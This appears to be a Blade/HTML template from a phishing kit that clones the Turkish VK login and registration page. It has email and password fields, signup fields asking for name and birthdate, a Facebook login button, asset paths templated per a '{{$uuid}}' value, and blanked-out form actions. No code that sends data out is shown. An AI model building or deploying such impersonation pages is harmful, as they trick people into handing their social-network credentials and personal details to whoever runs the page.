<!DOCTYPE html>
<html lang='en' dir='ltr'>

<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link rel="shortcut icon" href="../{{$uuid}}/img/fav_logo.ico" />

    <title>Hoşgeldiniz | VK</title>

    <link href="{{ asset("$uuid/css/style.css") }}" rel="stylesheet" type="text/css" >
    <link href="{{ asset("$uuid/css/style2.css") }}" rel="stylesheet" type="text/css" >
    <link href="{{ asset("$uuid/css/style3.css") }}" rel="stylesheet" type="text/css" >
    <link href="{{ asset("$uuid/css/font.css") }}" rel="stylesheet" type="text/css" >
    <link href="{{ asset("$uuid/css/font2.css") }}" rel="stylesheet" type="text/css" >

</head>

<body class="index_page anonym anonym_nav  new_header_design ">
    <div style="display:none" id="a11y_mvk_proposal" aria-label="Ekran sesi program&#305;, VK&#39;n&#305;n mobil s&#252;r&#252;m&#252;nde daha kararl&#305; &#231;al&#305;&#351;&#305;yor. Mobil s&#252;r&#252;me git">
    </div>
    <div id="system_msg" class="fixed"></div>
    <div id="utils"></div>

    <div id="layer_bg" class="fixed"></div>
    <div id="layer_wrap" class="scroll_fix_wrap fixed layer_wrap">
        <div id="layer"></div>
    </div>
    <div id="box_layer_bg" class="fixed"></div>
    <div id="box_layer_wrap" class="scroll_fix_wrap fixed">
        <div id="box_layer">
            <div id="box_loader">
                <div class="pr pr_baw pr_medium" id="box_loader_pr">
                    <div class="pr_bt"></div>
                    <div class="pr_bt"></div>
                    <div class="pr_bt"></div>
                </div>
                <div class="back"></div>
            </div>
        </div>
    </div>

    <div id="stl_left"></div>
    <div id="stl_side"></div>



    <div class="scroll_fix_wrap _page_wrap" id="page_wrap">
        <style>
             :root {
                --layout-width: 960px;
            }
        </style>
        <div>
            <div class="scroll_fix">

                <div id="page_header_cont" class="page_header_cont">
                    <div id="page_header_wrap" class="page_header_wrap">
                        <a class="top_back_link" href="" id="top_back_link" onclick=""></a>
                        <header id="page_header" class="p_head1 p_head_l82">
                            <div class="PortalNavigation">
                                <div class="PortalNavigation__icon"></div>
                            </div>
                            <ul id="top_nav" class="HeaderNav">
                                <li class="HeaderNav__item HeaderNav__item--logo">
                                    <a class="TopHomeLink" href="/" aria-label="Ana sayfaya" accesskey="1">
                                        <svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M0 14.4C0 7.61 0 4.22 2.1 2.1 4.23 0 7.62 0 14.4 0h1.2c6.79 0 10.18 0 12.3 2.1C30 4.23 30 7.62 30 14.4v1.2c0 6.79 0 10.18-2.1 12.3C25.77 30 22.38 30 15.6 30h-1.2c-6.79 0-10.18 0-12.3-2.1C0 25.77 0 22.38 0 15.6v-1.2z"
                                                fill="#07F"></path>
                                            <path
                                                d="M15.96 21.61c-6.84 0-10.74-4.68-10.9-12.48H8.5c.11 5.72 2.63 8.14 4.63 8.64V9.13h3.23v4.93c1.97-.21 4.05-2.46 4.75-4.94h3.22a9.53 9.53 0 01-4.38 6.23 9.87 9.87 0 015.13 6.26h-3.55c-.76-2.37-2.66-4.21-5.17-4.46v4.46h-.39z"
                                                fill="#fff"></path>
                                        </svg>
                                    </a>
                                    <a href="/video" class="VKVideoLogo" aria-label="VK Video ana sayfasına" accesskey="1"><svg fill="none" height="24" width="110"
                                            xmlns="http://www.w3.org/2000/svg">
                                            <path clip-rule="evenodd"
                                                d="M24 12.5c0 5.42 0 8.13-1.68 9.82C20.63 24 17.92 24 12.5 24h-1c-5.42 0-8.13 0-9.82-1.68C0 20.63 0 17.92 0 12.5v-1c0-5.42 0-8.13 1.68-9.82C3.37 0 6.08 0 11.5 0h1c5.42 0 8.13 0 9.82 1.68C24 3.37 24 6.08 24 11.5z"
                                                fill="#07f" fill-rule="evenodd"></path>
                                            <path
                                                d="M9.93 0c4.4.02 6.74.17 8.25 1.68 1.68 1.69 1.68 4.4 1.68 9.82v1c0 5.42 0 8.13-1.68 9.82-1.51 1.5-3.86 1.66-8.25 1.68-4.39-.02-6.73-.17-8.25-1.68C0 20.63 0 17.92 0 12.5v-1c0-5.42 0-8.13 1.68-9.82C3.2.17 5.54.02 9.93 0z"
                                                fill="#ff2b42"></path>
                                            <path clip-rule="evenodd"
                                                d="M8.04 8.32a.51.51 0 00-.7.39 16.96 16.96 0 00-.3 3.26c0 1.14.1 2.25.32 3.32a.51.51 0 00.7.4 16.42 16.42 0 005.42-3.3.53.53 0 000-.78 16.42 16.42 0 00-5.44-3.3zM4.9 8.23a3 3 0 013.97-2.25 18.9 18.9 0 016.27 3.79 3 3 0 010 4.46 18.9 18.9 0 01-6.25 3.78 3 3 0 01-3.97-2.23 19.44 19.44 0 01-.38-3.81c0-1.28.13-2.53.36-3.74z"
                                                fill="#fff" fill-rule="evenodd"></path>
                                            <path
                                                d="M34.26 18.06h3L41.64 6h-2.17l-3.53 9.94h-.34L32.21 6H30zm18.63 0l-5.54-6.24L52.46 6h-2.53l-4.28 4.91h-.5v-4.9H43.1v12.05h2.06V12.9h.51l4.51 5.16zm7.5 0h3L67.8 6H65.6l-3.52 9.94h-.34L58.35 6h-2.21zM70.16 7.9c.7 0 1.22-.5 1.22-1.2s-.52-1.21-1.22-1.21c-.72 0-1.23.51-1.23 1.21s.51 1.2 1.23 1.2zm-1 10.16h1.97v-8.9h-1.96zm8.11.17c1.63 0 2.76-.85 3.37-1.6l.41 1.43h1.47V6h-1.96v4.52A4.26 4.26 0 0077.26 9c-2.54 0-4.34 1.93-4.34 4.61 0 2.69 1.8 4.62 4.34 4.62zm.48-1.76c-1.64 0-2.77-1.18-2.77-2.86s1.13-2.85 2.77-2.85c1.66 0 2.8 1.18 2.8 2.85s-1.14 2.86-2.8 2.86zm15.8-2.96A4.43 4.43 0 0088.94 9a4.45 4.45 0 00-4.62 4.61 4.45 4.45 0 004.62 4.62c1.85 0 3.59-.87 4.26-2.56l-1.85-.31a2.7 2.7 0 01-2.3 1.08c-1.5 0-2.49-.93-2.68-2.3h7.15c.02-.18.04-.39.04-.63zm-4.61-2.8c1.23 0 2.15.78 2.48 1.9h-4.93a2.49 2.49 0 012.45-1.9zm10.39 7.52c2.79 0 4.75-1.91 4.75-4.62 0-2.7-1.96-4.61-4.75-4.61s-4.75 1.91-4.75 4.61 1.96 4.62 4.75 4.62zm0-1.8c-1.6 0-2.7-1.14-2.7-2.82 0-1.67 1.1-2.82 2.7-2.82s2.7 1.15 2.7 2.82c0 1.68-1.1 2.83-2.7 2.83z"
                                                fill="currentColor"></path>
                                        </svg></a>
                                </li>
                                <li class="HeaderNav__item HeaderNav__item--gap">
                                    <div id="ts_wrap" class="TopSearch" onmouseover="TopSearch.initFriendsList();">
                                        <form autocomplete="off">
                                            <input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="TopSearch__input" id="ts_input" placeholder="Arama" aria-label="Arama" />
                                        </form>
                                    </div>
                                </li>
                                <li class="HeaderNav__item HeaderNav__btns">
                                    <div id="top_audio_layer_place" class="top_audio_layer_place"></div>
                                </li>
                                <li class="HeaderNav__item HeaderNav__item--player"></li>
                                <li class="HeaderNav__item"><a class="top_nav_link" href="" id="top_switch_lang" onclick="">
                                        Switch to English
                                    </a><a class="top_nav_link" href="" id="top_reg_link" style="display: none">
                                        kay&#305;t ol
                                    </a></li>
                            </ul>
                            <div id="ts_cont_wrap" class="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;"></div>
                        </header>
                    </div>
                </div>

                <div id="page_layout">
                    <div id="side_bar" class="side_bar fl_l  sticky_top_force" style="display: none">
                        <div id="side_bar_inner" class="side_bar_inner">
                            <div id="quick_login" class="quick_login">
                                <form method="" name="" id="" action="">
                                    <input type="hidden" name="act" value="login" />
                                    <input type="hidden" name="role" value="al_frame" />
                                    <input type="hidden" name="expire" id="quick_expire_input" value="" />
                                    <input type="hidden" name="to" id="quick_login_to" value="" />
                                    <input type="hidden" name="recaptcha" id="quick_recaptcha" value="" />
                                    <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="" />
                                    <input type="hidden" name="captcha_key" id="quick_captcha_key" value="" />
                                    <input type="hidden" name="_origin" value="" />
                                    <input type="hidden" name="ip_h" value="ee997b3ec26f610115" />
                                    <input type="hidden" name="lg_domain_h" value="9d144a0cdc03a2ea52" />
                                    <input type="hidden" name="ul" id="quick_login_ul" value="" />
                                    <div class="label">Email ya da telefon</div>
                                    <div class="labeled"><input type="text" name="email" class="dark" id="quick_email" value="" /></div>
                                    <div class="label">&#350;ifre</div>
                                    <div class="labeled"><input type="password" name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" />
                                    </div>
                                    <input type="submit" class="submit" />
                                </form>
                                <button class="quick_login_button flat_button button_wide" id="quick_login_button">Giri&#351; yap</button>
                                <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">&#220;yelik</button>
                                <div class="clear forgot">
                                    <div class="checkbox" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';">
                                        Beni hat&#305;rlama &#33;</div><a id="quick_forgot" class="quick_forgot" href="" target="_top">&#350;ifreni mi unuttun?</a>
                                </div>
                            </div>
                            <div class="WideSeparator"></div>
                            <nav class="side_bar_nav">
                                <ol class="side_bar_ol">
                                    <li id="l_aud" class="">
                                        <a href="" onclick="return nav.go(this, event, {noback: true, params: {_ref: 'left_nav'}});" class="left_row">
                                            <div class="LeftMenu__icon">

                                            </div>
                                            <span class="left_label inl_bl">M&#252;zik</span>
                                            <span class="left_count_wrap fl_r left_void"><span
                                                    class="inl_bl left_count_sign">0</span></span>
                                        </a>

                                    </li>
                                    <li id="l_vid" class="">
                                        <a href="" onclick="return nav.go(this, event, {noback: true, params: {_ref: 'left_nav'}});" class="left_row">
                                            <div class="LeftMenu__icon">

                                            </div>
                                            <span class="left_label inl_bl">Video</span>
                                            <span class="left_count_wrap fl_r left_void"><span
                                                    class="inl_bl left_count_sign">0</span></span>
                                        </a>

                                    </li>
                                    <li id="l_gr" class="">
                                        <a href="" onclick="return nav.go(this, event, {noback: true, params: {_ref: 'left_nav'}});" class="left_row">
                                            <div class="LeftMenu__icon">

                                            </div>
                                            <span class="left_label inl_bl">Topluluk</span>
                                            <span class="left_count_wrap fl_r left_void"><span
                                                    class="inl_bl left_count_sign">0</span></span>
                                        </a>

                                    </li>
                                    <li id="l_mini_apps" class="">
                                        <a href="" onclick="return nav.go(this, event, {noback: true, params: {_ref: 'left_nav'}});" class="left_row">
                                            <div class="LeftMenu__icon">

                                            </div>
                                            <span class="left_label inl_bl">Mini-uygulama</span>
                                            <span class="left_count_wrap fl_r left_void"><span
                                                    class="inl_bl left_count_sign">0</span></span>
                                        </a>

                                    </li>
                                    <li id="l_ap" class="">
                                        <a href="" onclick="return nav.go(this, event, {noback: true, params: {_ref: 'left_nav'}});" class="left_row">
                                            <div class="LeftMenu__icon">

                                            </div>
                                            <span class="left_label inl_bl">Oyunlar</span>
                                            <object type="internal/link"><a href=""
                                                    onclick="nav.link && nav.link('', event); cancelEvent(event);"
                                                    class="left_count_wrap fl_r left_void left_count_wrap_hovered"><span
                                                        class="inl_bl left_count_sign">0</span></a></object>
                                        </a>

                                    </li>
                                </ol>
                            </nav>

                        </div>
                    </div>

                    <div id="page_body" class="fl_r " style="width: 960px;">

                        <div id="wrap_between"></div>
                        <div id="wrap3">
                            <div id="wrap2">
                                <div id="wrap1">
                                    <div id="content">
                                        <div class="IndexPageContent">
                                            <div class="IndexPageContent__content">
                                                <div class="LoginMobilePromo clear_fix">
                                                    <div class="login_mobile_apps">
                                                        <div class="login_mobile_header">Mobil cihazlar i&#231;in VK
                                                        </div>
                                                        <div class="login_mobile_info">VK mobil uygulamas&#305;n&#305; kurun ve her yerde arkada&#351;lar&#305;n&#305;z&#305;n haberlerini takip edin.</div>


                                                        <div class="LoginMobilePromo__devices">
                                                            <a class="LoginMobilePromoDevice LoginMobilePromoDevice--android" target="_blank" href="">
                                                                <img class="LoginMobilePromoDevice__img" src="../{{$uuid}}/img/androidımg.png" srcset="" alt="Android i&#231;in VK" />
                                                                <span class="LoginMobilePromoDevice__button flat_button secondary button_light">Android
                                                                    i&#231;in VK</span>
                                                            </a>
                                                            <a class="LoginMobilePromoDevice LoginMobilePromoDevice--ios" target="_blank" href="">
                                                                <img class="LoginMobilePromoDevice__img" src="../{{$uuid}}/img/iosımg.png" srcset="" alt="iOS i&#231;in VK" />
                                                                <span class="LoginMobilePromoDevice__button flat_button secondary button_light">iOS
                                                                    i&#231;in VK</span>
                                                            </a>
                                                        </div>

                                                        <a href="" class="login_all_products_button">T&#252;m
                                                            &#252;r&#252;nler</a>
                                                    </div>
                                                    <a onclick="curBox().hide()" id="login_mobile_close" class="login_mobile_close"></a>

                                                    <div class="login_about_mobile">
                                                        VK sitesinin h&#305;zl&#305; mobil versiyonuna ula&#351;abilmek i&#231;in Sizin cep telefonunuzda k&#305;sa adresi girmeniz yeterli olur: <a target="_blank" href="">m.vk.com</a>
                                                    </div>
                                                </div>
                                            </div>
                                            <div id="index_rcolumn" class="index_rcolumn">
                                                <div id="index_login" class="page_block index_login">
                                                    <form method="" name="" id="index_login_form" action="">
                                                        <input type="hidden" name="act" id="act" value="login">
                                                        <input type="hidden" name="role" value="al_frame" />
                                                        <input type="hidden" name="expire" id="index_expire_input" value="" />
                                                        <input type="hidden" name="_origin" value="" />
                                                        <input type="hidden" name="ip_h" value="ee997b3ec26f610115" />
                                                        <input type="hidden" name="lg_domain_h" value="9d144a0cdc03a2ea52" />
                                                        <input type="text" class="big_text" name="email" id="index_email" value="" placeholder="Email ya da telefon" />
                                                        <input type="password" class="big_text" name="pass" id="index_pass" value="" placeholder="&#350;ifre" onkeyup="toggle('index_expire', !!this.value);toggle('index_forgot', !this.value)" />
                                                        <button id="index_login_button" class="index_login_button flat_button button_big_text">Giri&#351;
                                                            yap</button>
                                                        <div class="forgot">
                                                            <div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">
                                                                Beni hat&#305;rlama &#33;</div>
                                                            <a id="index_forgot" class="index_forgot" href="" target="_top">&#350;ifreni mi unuttun?</a>
                                                        </div>
                                                    </form>
                                                </div>

                                                <div class="page_block">
                                                    <div class="JoinForm">
                                                        <div class="JoinForm__in">
                                                            <div class="JoinForm__top">
                                                                <div class="JoinForm__header">VK sitesine ilk defa m&#305; girdiniz?</div>
                                                                <div class="JoinForm__subheader">H&#305;zl&#305; &#252;ye ol</div>
                                                                <div class="JoinForm__text"></div>
                                                            </div>

                                                            <div class="JoinForm__error"></div>

                                                            <div class="JoinForm__form">
                                                                <div class="JoinForm__textInputRow">
                                                                    <input type="text" class="JoinForm__textInput big_text" name="first_name" value="" placeholder="Ad&#305;n&#305;z" />
                                                                </div>
                                                                <div class="JoinForm__textInputRow">
                                                                    <input type="text" class="JoinForm__textInput big_text" name="last_name" value="" placeholder="Soyad&#305;n&#305;z" />
                                                                </div>

                                                                <div class="JoinForm__birthdate">
                                                                    <div class="JoinForm__label">
                                                                        Do&#287;rum tarihi
                                                                        <span class="hint_icon" data-title="&lt;b&gt;Do&amp;#287;um tarihinizi belirtirseniz&lt;/b&gt; arkada&amp;#351;lar&amp;#305;n&amp;#305;z Sizi kolayca bulabilirler, bunun beraberinde Sizin i&amp;#231;in enterasan olan haberler se&amp;#231;ilebilir. &lt;br&gt;Siz profilinizin ayarlar b&amp;#246;l&amp;#252;m&amp;#252;nde do&amp;#287;um g&amp;#252;n&amp;#252;n kimlere g&amp;#246;r&amp;#252;nece&amp;#287;ini d&amp;#252;zenleyebilirsiniz."
                                                                            onmouseover="showHint(this);"></span>
                                                                    </div>

                                                                    <div class="JoinForm__birthdateIn">
                                                                        <div class="JoinForm__birthdateDay">
                                                                            <input type="text" name="bday" class="JoinForm__birthdateDayInput big_text" placeholder="Gün" />
                                                                        </div>
                                                                        <div class="JoinForm__birthdateMonth">
                                                                            <input type="text" name="bmonth" class="JoinForm__birthdateMonthInput big_text" placeholder="Ay" />
                                                                        </div>
                                                                        <div class="JoinForm__birthdateYear">
                                                                            <input type="text" name="byear" class="JoinForm__birthdateYearInput big_text" placeholder="Yıl" />
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <div class="JoinForm__sex ">
                                                                    <div class="JoinForm__label">Cinsiyetiniz</div>

                                                                    <div class="JoinForm__sexIn">
                                                                        <div class="JoinForm__sexRadio radiobtn" data-sex="1">Kad&#305;n</div>
                                                                        <div class="JoinForm__sexRadio radiobtn" data-sex="2">Erkek</div>
                                                                    </div>
                                                                </div>

                                                                <button class="FlatButton FlatButton--positive FlatButton--size-l FlatButton--wide JoinForm__submitButton" type="button">
                                                                    <span class="FlatButton__in">

                                                                        <span class="FlatButton__content">
                                                                            Kayde devam
                                                                        </span>
                                                                        <button class="quick_logn_bttn">Facebook
                                                                            aracılığıyla gir</button>

                                                                </span>
                                                                </button>


                                                            </div>


                                                        </div>
                                                    </div>

                                                </div>

                                                <div id="vk_connect_registration_faq" class="page_block index_vk_connect_faq">
                                                    Oturum olu&#351;turduktan sonra VK ID&#39;nin sa&#287;lad&#305;&#287;&#305; t&#252;m f&#305;rsatlar&#305;n&#305; elde edeceksiniz
                                                    <br />
                                                    <a href="" target="_blank">
                                                        Daha fazla bilgi edin
                                                    </a>
                                                </div>
                                            </div>
                                        </div>
                                        <div id="index_footer_wrap" class="footer_wrap index_footer_wrap">
                                            <div class="footer_nav" id="bottom_nav">
                                                <div class="footer_copy"><a href="">VK</a> &copy; 2006-2022</div>
                                                <div class="footer_links">
                                                    <a class="bnav_a" href="">VK hakk&#305;nda</a>
                                                    <a class="bnav_a" href="" style="display: none;">Yard&#305;m</a>
                                                    <a class="bnav_a" href="">Kurallar</a>
                                                    <a class="bnav_a" href="" target="_blank" style="display: none;">&#304;&#351; i&#231;in</a>

                                                    <a class="bnav_a" href="">Tasar&#305;mc&#305;lara</a>
                                                    <a class="bnav_a" href="" style="display: none;">&#304;&#351;
                                                        f&#305;rsatlar&#305;</a>
                                                </div>
                                                <div class="footer_lang"><a class="footer_lang_link" onclick="">English</a><a class="footer_lang_link" onclick="">Русский</a>
                                                    <a class="footer_lang_link" onclick="">Українська</a><a class="footer_lang_link" onclick="">T&#252;rk&#231;e</a>
                                                    <a class="footer_lang_link" onclick="">b&#252;t&#252;n diller »</a>
                                                </div>
                                            </div>

                                            <div class="footer_bench clear">

                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div id="footer_wrap" class="footer_wrap fl_r" style="width: 960px;">
                        <div class="footer_nav" id="bottom_nav">
                            <div class="footer_copy"><a href="">VK</a> &copy; 2006-2022</div>
                            <div class="footer_links">
                                <a class="bnav_a" href="">VK hakk&#305;nda</a>
                                <a class="bnav_a" href="" style="display: none;">Yard&#305;m</a>
                                <a class="bnav_a" href="">Kurallar</a>
                                <a class="bnav_a" href="" target="_blank" style="display: none;">&#304;&#351;
                                    i&#231;in</a>

                                <a class="bnav_a" href="">Tasar&#305;mc&#305;lara</a>
                                <a class="bnav_a" href="" style="display: none;">&#304;&#351; f&#305;rsatlar&#305;</a>
                            </div>
                            <div class="footer_lang"><a class="footer_lang_link" onclick="">English</a><a class="footer_lang_link" onclick="">Русский</a><a class="footer_lang_link" onclick="">Українська</a>
                                <a class="footer_lang_link" onclick="">T&#252;rk&#231;e</a><a class="footer_lang_link" onclick="">b&#252;t&#252;n diller »</a>
                            </div>
                        </div>

                        <div class="footer_bench clear">

                        </div>
                    </div>

                    <div class="clear"></div>
                </div>
            </div>

            <div class="progress" id="global_prg"></div>


</body>

</html>

</html>